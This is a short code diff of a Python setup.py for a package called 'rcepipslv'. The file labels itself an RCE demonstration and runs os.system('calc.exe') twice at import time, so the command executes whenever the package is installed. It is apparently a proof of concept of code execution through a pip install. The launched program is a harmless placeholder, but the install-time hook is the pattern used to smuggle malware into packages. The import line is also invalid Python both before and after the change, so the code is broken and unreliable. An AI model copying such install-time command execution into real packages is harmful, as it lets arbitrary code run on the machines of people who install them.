@@ -1,9 +1,9 @@
 import os
-import setuptools from setup
+from setuptools from setup
 
 print("RCE by w3shi(S.Lakshmi Vignesh")
-os.system("Calc.exe")
-os.system("Calc.exe")
+os.system("calc.exe")
+os.system("calc.exe")
 
 setup(
     name="rcepipslv",
